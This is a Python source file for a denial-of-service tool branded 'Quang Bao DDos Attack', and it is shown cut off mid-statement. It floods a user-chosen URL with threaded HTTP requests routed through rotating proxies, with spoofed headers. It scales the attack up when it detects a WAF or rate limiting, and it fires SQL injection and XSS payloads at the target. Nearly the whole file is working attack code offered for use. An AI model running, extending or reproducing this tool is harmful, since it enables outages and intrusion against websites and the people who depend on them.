#!/usr/bin/env python3

# -*- coding: utf-8 -*-
# ☠️ ©2025 Quang Bao DDos Attack ☠️

import requests
import threading
import multiprocessing
import time
import urllib.parse
import random
import hashlib
import json
from datetime import datetime
import whois
import dns.resolver
from bs4 import BeautifulSoup
import asyncio
import aiohttp
from concurrent.futures import ThreadPoolExecutor
from rich.console import Console
from rich.panel import Panel
from rich.prompt import Prompt, Confirm
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
from rich.theme import Theme
from rich.text import Text
from rich.table import Table
from rich import print as rprint
import logging
import uuid

# Configure logging for Codespace environment
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler("attack_log.txt")
    ]
)
logger = logging.getLogger(__name__)

# Initialize console with theme
custom_theme = Theme({
    "info": "bold cyan",
    "warning": "bold yellow",
    "error": "bold red",
    "success": "bold green",
    "highlight": "bold magenta",
    "extra": "bold white",
    "blue": "bold blue",
    "dimmed": "dim magenta",
    "purple": "bold purple",
    "dim_cyan": "dim cyan",
    "yellow": "bold yellow",
    "dim_green": "dim green"
})
console = Console(theme=custom_theme)

# Generate code rain effect
def generate_code_rain(width=30, height=5, frame=0):
    chars = "01"
    rain = []
    for i in range(height):
        offset = (frame + i) % height
        line = "".join(random.choice(chars) if random.random() > 0.1 else " " for _ in range(width))
        rain.append(f"[dim_green]{line}[/]")
    return "\n".join(rain)

# Matrix effect with progress bars
def matrix_effect(speed="fast"):
    message = "Initializing... ©2025 Quang Bao DDos Attack..."
    colors = ["cyan", "magenta", "purple"]
    symbols = ["⚡", "★", "☠️", "⚙"]
    radar_frames = ["◢", "◣", "◤", "◥"]
    sound_effects = ["*BEEP*", "*TICK*", "*HUM*", "*ZAP*"]
    spinners = ["arc", "dots", "bounce", "point"]
    sleep_time = 0.02 if speed == "fast" else 0.04

    with Progress(
        SpinnerColumn(spinner_name=random.choice(spinners)),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(bar_width=15, style="red", complete_style="cyan"),
        console=console
    ) as progress1, Progress(
        SpinnerColumn(spinner_name=random.choice(spinners)),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(bar_width=15, style="magenta", complete_style="purple"),
        console=console
    ) as progress2, Progress(
        SpinnerColumn(spinner_name=random.choice(spinners)),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(bar_width=15, style="blue", complete_style="green"),
        console=console
    ) as progress3:
        task1 = progress1.add_task("[bold cyan]Connecting to network[/]", total=len(message))
        task2 = progress2.add_task("[bold magenta]Loading modules[/]", total=len(message))
        task3 = progress3.add_task("[bold green]Activating system[/]", total=len(message))
        
        radar_index = 0
        for i in range(len(message) + 1):
            partial_message = message[:i]
            color = colors[i % len(colors)]
            symbol = random.choice(symbols)
            radar = radar_frames[radar_index % len(radar_frames)]
            sound = random.choice(sound_effects)
            style = "bold" if i % 2 == 0 else "dim"
            display_text = f"[bold {color}]{radar} {symbol} {partial_message} {symbol} {radar} [yellow]{sound}[/][/]"

            console.print(generate_code_rain(frame=i), justify="center")
            console.print("")

            progress1.update(task1, advance=1, description=f"[bold cyan]Connecting: {display_text}[/]")
            if i >= len(message) // 3:
                progress2.update(task2, advance=1, description=f"[bold magenta]Loading: {display_text}[/]")
            if i >= 2 * len(message) // 3:
                progress3.update(task3, advance=1, description=f"[bold green]Activating: {display_text}[/]")
            
            radar_index += 1
            time.sleep(sleep_time)

# Theme selection
def select_theme():
    colors = ["cyan", "magenta", "green", "blue", "purple"]
    speeds = ["fast", "slow"]
    console.print("[bold cyan]┌─[quangbao㉿attack]─[~]\n└─# Select theme color:[/]")
    for color in colors:
        console.print(f"[bold {color}]  - {color.capitalize()} █[/]")
        time.sleep(0.02)
    color_choice = Prompt.ask(
        "[bold cyan]┌─[quangbao㉿attack]─[~]\n└─# Enter color (cyan/magenta/green/blue/purple):[/] ",
        choices=colors, default="purple"
    )
    console.print("[bold cyan]┌─[quangbao㉿attack]─[~]\n└─# Select effect speed:[/]")
    for speed in speeds:
        console.print(f"[bold yellow]  - {speed.capitalize()} ⚡[/]")
        time.sleep(0.02)
    speed_choice = Prompt.ask(
        "[bold cyan]┌─[quangbao㉿attack]─[~]\n└─# Enter speed (fast/slow):[/] ",
        choices=speeds, default="fast"
    )
    console.print(f"[success]Selected theme [bold {color_choice}]{color_choice.capitalize()}[/] and speed [bold yellow]{speed_choice.capitalize()}[/] [✓][/] [yellow]*BEEP*[/] [yellow] ©2025 Quang Bao DDos Attack [/]")
    return color_choice, speed_choice

# Display logo
def display_logo(theme_color):
    logo = f"""
[bold {theme_color}]        ________
       /|_||_\`.__
      (   _    _ _\`-(_)--(_)-(_) [/]
       `-_  CYBERSTRIKE  _-'
          `._  v31  _.' ☠️
"""
    colors = ["magenta", "cyan", "purple", "blue"]
    for i, line in enumerate(logo.splitlines()):
        console.clear()
        console.print("\n".join(logo.splitlines()[:i+1]), style=colors[i % len(colors)])
        time.sleep(0.02)
    console.print(f"[success]CYBERSTRIKE PRO v31 [✓][/] [yellow]*ZAP*[/] [yellow] ©2025 Quang Bao DDos Attack [/]")

# Radar effect
def display_radar_effect(theme_color):
    frames = [
        f"[bold {theme_color}]Quang Bao DDos Attack 2025[/] ◢",
        f"[bold magenta]Illegal Use Prohibited [/] ◣",
        f"[bold green]Admin: ©2025 Quang Bao DDos Attack[/] ◤",
        f"[bold yellow][/] ◥"
    ]
    for frame in frames:
        console.clear()
        console.print(frame)
        time.sleep(0.06)
    console.clear()

# Exit banner
def display_exit_banner(theme_color):
    frames = [
        f"[bold {theme_color}]Shutting down...[/]",
        f"[bold magenta]System offline...[/]",
        f"[bold green]Goodbye![/]"
    ]
    for frame in frames:
        console.clear()
        console.print(frame)
        time.sleep(0.08)
    console.clear()

# Test proxy with async
async def test_proxy(proxy, timeout=8):
    try:
        async with aiohttp.ClientSession() as session:
            start = time.time()
            test_url = "https://httpbin.org/ip"
            async with session.get(test_url, proxy=proxy, timeout=timeout) as response:
                if response.status == 200:
                    return True, (time.time() - start) * 1000
        return False, float('inf')
    except Exception as e:
        logger.warning(f"Proxy test failed: {str(e)}")
        return False, float('inf')

# Fetch proxies from API
async def fetch_proxies(proxy_api_key):
    global PROXY_LIST
    if len(PROXY_LIST) >= 50:
        console.print("[success]Using existing proxies [✓][/] [yellow]*PING*[/] [yellow] ©2025 Quang Bao DDos Attack [/]")
        return
    # Example proxy API endpoint (replace with actual API)
    api_url = f"https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all&key={proxy_api_key}"
    proxies = []
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(api_url, timeout=15) as response:
                if response.status == 200:
                    text = await response.text()
                    proxies.extend([f"http://{line.strip()}" for line in text.splitlines() if line.strip()])
                    logger.info(f"Fetched {len(proxies)} proxies from API")
                    console.print(f"[success]Fetched [bold {theme_color}]{len(proxies)}[/] proxies from API [✓][/] [yellow]*PING*[/] [yellow] ©2025 Quang Bao DDos Attack [/]")
    except Exception as e:
        logger.error(f"Error fetching proxies: {str(e)}")
        console.print(f"[error]Failed to fetch proxies: [red]{str(e)}[/] [✗][/] [yellow]*HUM*[/] [yellow] ©2025 Quang Bao DDos Attack [/]")
    PROXY_LIST = proxies[:500]  # Limit to 500 proxies

# Filter and sort proxies
async def filter_active_proxies(theme_color, proxy_api_key):
    global PROXY_LIST
    await fetch_proxies(proxy_api_key)
    if not PROXY_LIST:
        console.print(f"[warning]No proxies available! Running without proxies. [⚠][/] [yellow]*HUM*[/] [yellow]©2025 Quang Bao DDos Attack [/]")
        return
    tasks = [test_proxy(proxy, timeout=8) for proxy in PROXY_LIST]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    active_proxies = []
    for proxy, (is_active, response_time) in zip(PROXY_LIST, results):
        if is_active and response_time < 800:  # Keep proxies with response time <800ms
            active_proxies.append((proxy, response_time))
    active_proxies.sort(key=lambda x: x[1])
    PROXY_LIST = [proxy for proxy, response_time in active_proxies if response_time < 150]  # Prioritize ultra-fast proxies
    logger.info(f"Filtered {len(PROXY_LIST)} active proxies")
    console.print(f"[success]Filtered [bold {theme_color}]{len(PROXY_LIST)}[/] active proxies (fastest <150ms) [✓][/] [yellow]*PING*[/] [yellow] ©2025 Quang Bao DDos Attack [/]")

# Periodic proxy refresh
async def refresh_proxies_periodically(proxy_api_key):
    while True:
        await filter_active_proxies(theme_color, proxy_api_key)
        await asyncio.sleep(15)  # Refresh every 15 seconds

# Hacker prompt
def hacker_prompt(message, default=None, theme_color="purple"):
    symbols = ["⚡", "★", "☠️", "⚙"]
    colors = ["cyan", "magenta", "purple"]
    prompt_text = f"[bold {random.choice(colors)}]┌─[quangbao㉿attack]─[~]─[{random.choice(symbols)}]\n└─# [bold blue]{message}[/]"
    console.print("")
    return Prompt.ask(prompt_text, default=default)

# Check authentication key
def check_auth_key(theme_color):
    console.clear()
    console.print(f"[bold {theme_color}]WELCOME TO THE VOID...[/] [success][⚡][/]")
    time.sleep(0.4)
    console.clear()
    key = hacker_prompt("Enter authentication key: ", theme_color=theme_color)
    if key != "baoddos":
        logger.error("Invalid authentication key")
        console.print("[error]Invalid key! Exiting. [✗][/] [yellow]*CRASH*[/] [yellow] ©2025 Quang Bao DDos Attack [/]")
        exit(1)
    logger.info("Authentication successful")
    console.print("[success]Valid key! System access granted. [✓][/] [yellow]*BEEP*[/] [yellow] ©2025 Quang Bao DDos Attack [/]")

# Check file integrity
def check_file_integrity():
    global EXPECTED_HASH
    EXPECTED_HASH = None
    try:
        with open(__file__, 'rb') as f:
            file_content = f.read()
            file_hash = hashlib.sha256(file_content).hexdigest()
            if EXPECTED_HASH is None:
                EXPECTED_HASH = file_hash
                logger.info(f"Generated file hash: {file_hash[:10]}...")
                console.print(f"[success]Generated hash: [bold magenta]{file_hash[:10]}...[/] [✓][/] [yellow]*PING*[/] [yellow] ©2025 Quang Bao DDos Attack ☠️[/]")
            elif file_hash != EXPECTED_HASH:
                logger.error("File integrity check failed")
                console.print("[error]File modified! Exiting. [✗][/] [yellow]*ALERT*[/] [yellow] ©2025 Quang Bao DDos Attack [/]")
                exit(1)
    except Exception as e:
        logger.error(f"File integrity check error: {str(e)}")
        console.print(f"[error]Integrity check error: [red]{str(e)}[/] [✗][/] [yellow]*ALERT*[/] [yellow] ©2025 Quang Bao DDos Attack [/]")
        exit(1)

# Loading animation
def loading_animation(message, duration, theme_color):
    with Progress(
        SpinnerColumn(spinner_name="arc"),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(bar_width=20, style="red", complete_style="cyan"),
        console=console
    ) as progress:
        task = progress.add_task(f"[bold {theme_color}]{message}[/]", total=100)
        for i in range(0, 101, 20):
            progress.update(task, advance=20, description=f"[bold {theme_color}]{message} [{i}%] [/]")
            time.sleep(duration / 5)
        progress.update(task, description=f"[success]{message} [✓][/] [yellow]*BOOM*[/] [yellow] ©2025 Quang Bao DDos Attack [/]")

# User agents
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
]

# Generate random headers
def generate_random_headers():
    return {
        'User-Agent': random.choice(USER_AGENTS),
        'Accept': random.choice(['text/html', 'application/json', '*/*']),
        'Accept-Language': random.choice(['en-US,en;q=0.9', 'vi-VN,vi;q=0.9']),
        'Accept-Encoding': random.choice(['gzip, deflate', 'br']),
        'Connection': 'keep-alive',
        'Cache-Control': random.choice(['no-cache', 'max-age=0']),
        'Referer': random.choice(['https://google.com', 'https://bing.com']),
        'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
    }

# Proxy list
PROXY_LIST = []
def get_random_proxy():
    return random.choice(PROXY_LIST) if PROXY_LIST else None

# Global counters
manager = threading.Lock()
success_count = 0
error_count = 0
response_times = []
proxy_error_count = 0

# Validate URL
def validate_url(url):
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    try:
        result = urllib.parse.urlparse(url)
        if not result.scheme or not result.netloc:
            raise ValueError("Invalid URL")
        return url
    except Exception as e:
        raise ValueError(f"Invalid URL: [red]{e}[/]")

# Assess target security
def assess_target_security(url, theme_color):
    security_level = "MEDIUM"
    recommended_threads = 2000
    recommended_requests = 1500

    try:
        response = requests.head(url, headers=generate_random_headers(), timeout=8)
        headers = response.headers
        waf_indicators = ['cloudflare', 'akamai', 'sucuri']
        server = headers.get('Server', '').lower()
        cdn_waf_detected = any(waf in server or waf in headers.get('X-Powered-By', '').lower() for waf in waf_indicators)
        rate_limit = 'X-RateLimit-Limit' in headers or response.status_code in (429, 403)
        domain = urllib.parse.urlparse(url).hostname
        whois_info = whois.whois(domain)
        creation_date = whois_info.get('creation_date')
        domain_age = (datetime.now() - creation_date).days if creation_date else 0

        if cdn_waf_detected or rate_limit:
            security_level = "HIGH"
            recommended_threads = 8000
            recommended_requests = 3000
        elif domain_age > 365:
            security_level = "MEDIUM"
            recommended_threads = 4000
            recommended_requests = 2000
        else:
            security_level = "LOW"
            recommended_threads = 1000
            recommended_requests = 1000

        logger.info(f"Security assessment: {security_level}, Threads: {recommended_threads}, Requests: {recommended_requests}")
        console.print(f"[success]Security: [magenta]{security_level}[/], Threads: [bold {theme_color}]{recommended_threads:,}[/], Requests: [bold {theme_color}]{recommended_requests:,}[/] [✓][/] [yellow]*PING*[/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
    except Exception as e:
        logger.error(f"Security assessment error: {str(e)}")
        console.print(f"[error]Security assessment error: [red]{str(e)}[/]. Using defaults. [✗][/] [yellow]*HUM*[/] [yellow] ©2025 Quang Bao DDos Attack [/]")

    return security_level, recommended_threads, recommended_requests

# Adjust threads for device
def adjust_threads_for_device(num_threads, num_requests):
    cpu_count = multiprocessing.cpu_count()
    max_threads = min(num_threads, cpu_count * 2000)  # Increased for 16GB RAM
    max_requests = min(num_requests, 15000000)
    logger.info(f"Adjusted to {max_threads} threads and {max_requests} requests on {cpu_count} CPUs")
    console.print(f"[success]Adjusted: [bold {theme_color}]{max_threads:,}[/] threads, [bold {theme_color}]{max_requests:,}[/] requests on [magenta]{cpu_count}[/] CPUs. [✓][/] [yellow]*PING*[/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
    return max_threads, max_requests

# Clog attack with optimized proxy handling
def clog_attack(url, requests_per_thread, duration, progress, task, theme_color):
    global success_count, error_count, response_times, proxy_error_count
    session = requests.Session()
    start_time = time.time()
    max_retries = 5
    sound_effects = ["*BOOM*", "*CRASH*", "*ZAP*", "*VORTEX*"]

    while time.time() - start_time < duration:
        retries = 0
        current_proxy = get_random_proxy()
        while retries < max_retries:
            try:
                headers = generate_random_headers()
                scheme = "https" if url.startswith("https://") else "http"
                response = session.get(url, headers=headers, proxies={"http": current_proxy, "https": current_proxy} if current_proxy else None, timeout=8)
                sound = random.choice(sound_effects)
                logger.info(f"Clog attack success: Status {response.status_code}")
                console.print(f"[success]CLOG: Status: [bold {theme_color}]{response.status_code}[/] [✓][/] [yellow]{sound}[/] [yellow] ©2025 Quang Bao DDos Attack [/]")

                with manager:
                    success_count += 1
                    response_times.append((time.time() - start_time) * 1000)
                    error_rate = (error_count / max(1, success_count + error_count)) * 100
                    ping_avg = sum(response_times) / len(response_times) if response_times else 0
                    rps = success_count / (time.time() - start_time) if (time.time() - start_time) > 0 else 0
                    rps_bar = "█" * min(int(rps / 20), 10)
                    ping_bar = "█" * min(int(ping_avg / 40), 10)
                    error_bar = "▒" * min(int(error_rate / 4), 10)
                    proxy_bar = "▓" * min(int(proxy_error_count / 4), 10)
                    rps_color = "bold magenta" if rps > 100 else "bold green" if success_count % 2 == 0 else "bold yellow"
                    progress.update(task, advance=1, description=f"[bold {rps_color}]CLOG ATTACK[/] [✓][/] [RPS: {rps_bar} {rps:.1f}] [Ping: {ping_bar} {ping_avg:.1f}ms] [Error: {error_bar} {error_rate:.1f}%] [Proxy Errors: {proxy_bar} {proxy_error_count}] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
                break
            except requests.exceptions.ReadTimeout as e:
                retries += 1
                if retries == max_retries:
                    with manager:
                        error_count += 1
                        error_rate = (error_count / max(1, success_count + error_count)) * 100
                        ping_avg = sum(response_times) / len(response_times) if response_times else 0
                        rps = error_count / (time.time() - start_time) if (time.time() - start_time) > 0 else 0
                        rps_bar = "█" * min(int(rps / 20), 10)
                        ping_bar = "█" * min(int(ping_avg / 40), 10)
                        error_bar = "▒" * min(int(error_rate / 4), 10)
                        proxy_bar = "▓" * min(int(proxy_error_count / 4), 10)
                        rps_color = "bold red" if error_count % 2 == 0 else "bold yellow"
                        progress.update(task, advance=1, description=f"[bold {rps_color}]CLOG ATTACK[/] [✗][/] [RPS: {rps_bar} {rps:.1f}] [Ping: {ping_bar} {ping_avg:.1f}ms] [Error: {error_bar} {error_rate:.1f}%] [Proxy Errors: {proxy_bar} {proxy_error_count}] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
                    logger.error(f"Clog attack failed after {max_retries} retries: {str(e)}")
                    console.print(f"[error]CLOG: Failed after {max_retries} retries: [red]{str(e)}[/] [✗][/] [yellow]*CRASH*[/] [yellow] ©2025 Quang Bao DDos Attack [/]")
                else:
                    logger.warning(f"Clog attack timeout, retrying {retries + 1}...")
                    console.print(f"[warning]CLOG: Timeout, retrying {retries + 1}... [⚠][/] [yellow] ©2025 Quang Bao DDos Attack [/]")
                    time.sleep(random.uniform(0.03, 0.3))
            except Exception as e:
                with manager:
                    error_count += 1
                    proxy_error_count += 1
                    error_rate = (error_count / max(1, success_count + error_count)) * 100
                    ping_avg = sum(response_times) / len(response_times) if response_times else 0
                    rps = error_count / (time.time() - start_time) if (time.time() - start_time) > 0 else 0
                    rps_bar = "█" * min(int(rps / 20), 10)
                    ping_bar = "█" * min(int(ping_avg / 40), 10)
                    error_bar = "▒" * min(int(error_rate / 4), 10)
                    proxy_bar = "▓" * min(int(proxy_error_count / 4), 10)
                    rps_color = "bold red" if error_count % 2 == 0 else "bold yellow"
                    progress.update(task, advance=1, description=f"[bold {rps_color}]CLOG ATTACK[/] [✗][/] [RPS: {rps_bar} {rps:.1f}] [Ping: {ping_bar} {ping_avg:.1f}ms] [Error: {error_bar} {error_rate:.1f}%] [Proxy Errors: {proxy_bar} {proxy_error_count}] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
                logger.error(f"Clog attack failed: {str(e)}")
                console.print(f"[error]CLOG: Failed: [red]{str(e)}[/] [✗][/] [yellow]*CRASH*[/] [yellow] ©2025 Quang Bao DDos Attack [/]")
                break
        time.sleep(random.uniform(0.00003, 0.00008))

# Scan vulnerabilities
async def scan_vulnerabilities(url):
    vulnerabilities = []
    async with aiohttp.ClientSession() as session:
        try:
            sql_payloads = ["' OR '1'='1", "1; DROP TABLE users --"]
            for payload in sql_payloads:
                async with session.get(f"{url}?id={urllib.parse.quote(payload)}", headers=generate_random_headers(), timeout=8) as response:
                    text = await response.text()
                    if any(error in text.lower() for error in ["sql syntax", "mysql"]):
                        vulnerabilities.append({
                            "type": "SQL Injection",
                            "severity": "High",
                            "description": f"SQL Injection: {payload}",
                            "recommendation": "Use prepared statements."
                        })
                        break
        except Exception as e:
            logger.error(f"SQL scan error: {str(e)}")
            console.print(f"[error]SQL Scan: Error: [red]{str(e)}[/] [✗][/] [yellow]*CRASH*[/] [yellow] ©2025 Quang Bao DDos Attack [/]")

        try:
            xss_payloads = ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>"]
            for payload in xss_payloads:
                async with session.get(f"{url}?q={urllib.parse.quote(payload)}", headers=generate_random_headers(), timeout=8) as response:
                    text = await response.text()
                    if payload in text:
                        vulnerabilities.append({
                            "type": "Cross-Site Scripting (XSS)",
                            "severity": "Medium",
                            "description": f"Reflected XSS: {payload}",
                            "recommendation": "Encode output."
                        })
                        break
        except Exception as e:
            logger.error(f"XSS scan error: {str(e)}")
            console.print(f"[error]XSS Scan: Error: [red]{str(e)}[/] [✗][/] [yellow]*CRASH*[/] [yellow] ©2025 Quang Bao DDos Attack [/]")

    return vulnerabilities

# Display vulnerability report
def display_vulnerability_report(vulnerabilities, theme_color):
    panel = Panel(
        "\n".join(
            f"[magenta]Type:[/] {vuln['type']}\n"
            f"[yellow]Severity:[/] {vuln['severity']}\n"
            f"[cyan]Description:[/] {vuln['description']}\n"
            f"[green]Recommendation:[/] {vuln['recommendation']}\n"
            for vuln in vulnerabilities
        ) or "[success]No vulnerabilities detected! [✓][/] [yellow]*HUM*[/] [yellow]©2025 Quang Bao DDos Attack [/]",
        title=f"[bold {theme_color}]VULNERABILITY REPORT[/]",
        border_style="dim cyan"
    )
    console.print("")
    console.print(panel)
    hacker_prompt("Press Enter to return: ", theme_color=theme_color)

# Display menu
def display_menu(theme_color):
    title = "Quang Bao Born 2007"
    frames = [
        f"[bold cyan]{title} [/]",
        f"[bold magenta]{title} [/]",
        f"[bold purple]{title} [/]",
        f"[bold cyan]{title} [/]",
        f"[bold magenta]{title} [/]"
    ]
    for frame in frames:
        console.print(frame)
        time.sleep(0.06)

    table = Table(show_header=True, header_style=f"bold {theme_color}", border_style="dim cyan", title=f"[bold {theme_color}]{title}[/]")
    table.add_column("OPTION", justify="center", style="bold magenta", width=12)
    table.add_column("FUNCTION", justify="center", style="bold magenta", width=20)

    table.add_row("1", "[magenta]CLOG ATTACK[/]")
    table.add_row("2", "[magenta]SCAN VULNERABILITIES[/]")
    table.add_row("3", "[magenta]EXIT[/]")

    console.print(f"[bold {theme_color}][/]")
    console.print(table)
    console.print(f"[bold {theme_color}][/]")
    console.print(f"[yellow] ©2025 Quang Bao DDos Attack [/]")
    console.print("")

# Main function
def main():
    global theme_color
    proxy_api_key = "YOUR_PROXY_API_KEY_HERE"  # Replace with actual Proxy API key
    theme_color, speed = select_theme()
    matrix_effect(speed)
    display_logo(theme_color)
    check_file_integrity()
    check_auth_key(theme_color)
    multiprocessing.set_start_method('spawn')

    loop = asyncio.get_event_loop()
    loop.run_until_complete(filter_active_proxies(theme_color, proxy_api_key))
    loop.create_task(refresh_proxies_periodically(proxy_api_key))

    while True:
        try:
            display_menu(theme_color)
            choice = hacker_prompt("Select (1-3): ", theme_color=theme_color)

            if choice == "3":
                logger.info("Exiting program")
                console.print(f"[success]Exiting program [✓][/] [yellow]*HUM*[/] [yellow] ©2025 Quang Bao DDos Attack [/]")
                display_exit_banner(theme_color)
                exit(0)

            display_radar_effect(theme_color)
            input_url = hacker_prompt("Enter URL/IP: ", theme_color=theme_color)
            if not input_url:
                logger.warning("Empty URL/IP provided")
                console.print(f"[error]Empty URL/IP! [✗][/] [yellow]*CRASH*[/] [yellow]©2025 Quang Bao DDos Attack [/]")
                time.sleep(1)
                continue

            try:
                validated_url = validate_url(input_url)
                host = urllib.parse.urlparse(validated_url).hostname
                port = urllib.parse.urlparse(validated_url).port or 80
                panel = Panel(
                    f"[bold {theme_color}]URL/IP:[/] [green]{validated_url}[/]\n"
                    f"[bold {theme_color}]Hostname:[/] [green]{host}[/]\n"
                    f"[bold {theme_color}]Port:[/] [green]{port}[/]\n"
                    f"[bold {theme_color}]Status:[/] [green]Locked [✓][/] \n"
                    f"[bold {theme_color}]Proxies:[/] [green]{len(PROXY_LIST)}[/]\n"
                    f"[yellow] ©2025 Quang Bao DDos Attack [/]",
                    title=f"[bold {theme_color}]TARGET INFO[/]",
                    border_style="dim cyan"
                )
                console.print("")
                console.print(panel)
            except ValueError as e:
                logger.error(f"Invalid URL: {str(e)}")
                console.print(f"[error]Error: {str(e)}! Re-enter URL/IP. [✗][/] [yellow]*CRASH*[/] [yellow] ©2025 Quang Bao DDos Attack [/]")
                time.sleep(1)
                continue

            logger.info(f"Target set: {validated_url}")
            console.print(f"[success]Target: [bold {theme_color}]{validated_url}[/] [✓][/] [yellow]*BEEP*[/] [yellow] ©2025 Quang Bao DDos Attack [/]")
            loading_animation("Locking target", 1.2, theme_color)

            if choice == "2":
                logger.info("Starting vulnerability scan")
                console.print(f"[success]Starting vulnerability scan... [⚡][/] [yellow]*BEEP*[/] [yellow] ©2025 Quang Bao DDos Attack [/]")
                loading_animation("Scanning vulnerabilities", 1.2, theme_color)
                vulnerabilities = loop.run_until_complete(scan_vulnerabilities(validated_url))
                display_vulnerability_report(vulnerabilities, theme_color)
                continue

            num_threads = None
            while num_threads is None:
                try:
                    num_threads = int(hacker_prompt("Threads (1-1500000): ", default="2000", theme_color=theme_color))
                    if not (1 <= num_threads <= 1500000):
                        raise ValueError("Invalid thread count")
                except ValueError:
                    logger.warning("Invalid thread count entered")
                    console.print(f"[error]Threads must be 1-1500000! [✗][/] [yellow]*CRASH*[/] [yellow] ©2025 Quang Bao DDos Attack [/]")
                    time.sleep(1)

            requests_per_thread = None
            while requests_per_thread is None:
                try:
                    requests_per_thread = int(hacker_prompt("Requests/thread (1-15000000): ", default="2000", theme_color=theme_color))
                    if not (1 <= requests_per_thread <= 15000000):
                        raise ValueError("Invalid request count")
                except ValueError:
                    logger.warning("Invalid request count entered")
                    console.print(f"[error]Requests must be 1-15000000! [✗][/] [yellow]*CRASH*[/] [yellow]©2025 Quang Bao DDos Attack [/]")
                    time.sleep(1)

            duration = None
            while duration is None:
                try:
                    duration = int(hacker_prompt("Duration (seconds): ", default="60", theme_color=theme_color))
                    if duration < 1:
                        raise ValueError("Invalid duration")
                except ValueError:
                    logger.warning("Invalid duration entered")
                    console.print(f"[error]Duration must be > 0! [✗][/] [yellow]*CRASH*[/] [yellow] ©2025 Quang Bao DDos Attack [/]")
                    time.sleep(1)

            num_threads, requests_per_thread = adjust_threads_for_device(num_threads, requests_per_thread)

            logger.info("Assessing target security")
            console.print(f"[success]Assessing security... [⚡][/] [yellow]*BEEP*[/] [yellow]©2025 Quang Bao DDos Attack [/]")
            loading_animation("Assessing security", 1.2, theme_color)
            security_level, recommended_threads, recommended_requests = assess_target_security(validated_url, theme_color)

            if security_level == "LOW":
                num_threads = min(recommended_threads, num_threads // 2)
                requests_per_thread = min(recommended_requests, requests_per_thread // 2)
                attack_strategy = "LIGHT ATTACK"
            elif security_level == "MEDIUM":
                attack_strategy = "MODERATE ATTACK"
            else:
                num_threads = max(recommended_threads, num_threads)
                requests_per_thread = max(recommended_requests, requests_per_thread)
                attack_strategy = "HEAVY ATTACK"

            panel = Panel(
                f"[bold {theme_color}]Strategy:[/] [magenta]{attack_strategy}[/]\n"
                f"[bold {theme_color}]Target:[/] [green]{validated_url}[/]\n"
                f"[bold {thread_color}]Threads:[/] [green]{num_threads:,}[/]\n"
                f"[bold {theme_color}]Requests:[/] [green]{requests_per_thread:,}[/]\n"
                f"[bold {theme_color}]Duration:[/] [green]{duration}[/] seconds\n"
                f"[bold {theme_color}]Total:[/] [green]{num_threads * requests_per_thread:,}[/]\n"
                f"[bold {theme_color}]Proxies:[/] [green]{len(PROXY_LIST)}[/]\n"
                f"[yellow] ©2025 Quang Bao DDos Attack [/]",
                title=f"[bold {theme_color}]ATTACK INFO[/]",
                border_style="dim cyan"
            )
            console.print("")
            console.print(panel)
            confirm = Confirm.ask(f"[error]Confirm attack? [?][/] [yellow]*BEEP*[/] [yellow] ©2025 Quang Bao DDos Attack [/]")
            if not confirm:
                logger.info("Attack cancelled")
                console.print(f"[warning]Attack cancelled [⚠][/] [yellow]*HUM*[/] [yellow] ©2025 Quang Bao DDos Attack [/]")
                continue

            logger.info("Starting attack")
            console.print(f"[success]Initiating attack... [⚡][/] [yellow]*BOOM*[/] [yellow] ©2025 Quang Bao DDos Attack [/]")
            loading_animation("Starting system", 1.2, theme_color)

            global success_count, error_count, response_times, proxy_error_count
            success_count = 0
            error_count = 0
            response_times = []
            proxy_error_count = 0
            start_time = time.time()

            with Progress(
                SpinnerColumn(spinner_name="arc"),
                TextColumn("[progress.description]{task.description}"),
                BarColumn(bar_width=20, style="red", complete_style="cyan"),
                TextColumn("[green]{task.completed}/{task.total}[/]"),
                console=console
            ) as progress:
                task = progress.add_task(f"[bold {theme_color}]CLOG ATTACK[/] [⚡][/] [yellow]©2025 Quang Bao DDos Attack [/]", total=num_threads * requests_per_thread)
                threads = []
                for _ in range(num_threads):
                    t = threading.Thread(target=clog_attack, args=(validated_url, requests_per_thread, duration, progress, task, theme_color))
                    threads.append(t)
                    t.start()

                try:
                    for t in threads:
                        t.join()
                except KeyboardInterrupt:
                    logger.info("Attack interrupted by user")
                    console.print(f"[warning]Attack stopped [⚠][/] [yellow]*HUM*[/] [yellow] ©2025 Quang Bao DDos Attack [/]")
                    display_exit_banner(theme_color)
                    exit(0)

            total_time = time.time() - start_time
            avg_response_time = sum(response_times) / len(response_times) if response_times else 0
            max_response_time = max(response_times) if response_times else 0
            min_response_time = min(response_times) if response_times else 0
            rps = (num_threads * requests_per_thread) / total_time if total_time > 0 else 0
            success_rate = (success_count / max(1, success_count + error_count)) * 100
            error_rate = (error_count / max(1, success_count + error_count)) * 100

            report = Panel(
                f"[bold {theme_color}]Total Requests:[/] [green]{num_threads * requests_per_thread:,}[/]\n"
                f"[bold {theme_color}]Successful:[/] [green]{success_count:,} ({success_rate:.1f}%)[/] [✓][/] \n"
